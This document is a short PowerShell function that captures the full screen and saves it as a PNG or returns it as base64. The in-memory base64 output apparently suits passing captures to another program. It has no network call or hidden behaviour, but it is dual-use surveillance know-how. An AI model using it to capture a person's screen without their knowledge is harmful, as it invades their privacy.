Function Get-Screenshot
{
    param($File)
    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $msimage = New-Object IO.MemoryStream
    if ($File) {
        $bitmap.save($file, "png")
    } else {
        $bitmap.save($msimage, "png")
        $b64 = [Convert]::ToBase64String($msimage.toarray())
    }
    return $b64
}